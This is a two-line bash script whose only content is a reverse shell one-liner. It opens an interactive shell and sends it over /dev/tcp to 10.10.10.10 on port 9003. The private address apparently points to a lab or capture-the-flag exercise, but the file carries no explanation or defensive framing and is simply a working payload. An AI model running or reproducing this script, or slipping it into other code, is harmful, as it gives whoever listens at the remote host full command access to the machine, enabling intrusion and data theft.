#!/bin/bash
sh -i >& /dev/tcp/10.10.10.10/9003 0>&1
